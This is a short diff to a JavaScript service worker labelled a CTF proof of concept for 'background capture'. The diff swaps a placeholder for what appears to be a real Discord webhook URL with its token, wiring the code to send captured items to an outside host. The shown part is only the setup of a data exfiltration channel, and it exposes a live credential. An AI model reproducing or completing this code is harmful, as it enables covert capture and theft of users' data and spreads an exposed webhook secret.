@@ -2,7 +2,7 @@ self.addEventListener('message', async event => {
     if (event.data.action !== 'startBackgroundCapture') return;
 
     // WARNING: Ethical CTF PoC only. Unauthorized use violates privacy laws.
-    const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // Replace with actual webhook URL
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di'; // Replace with actual webhook URL
 
     async function sendItem(type, data, index = null) {
         try {
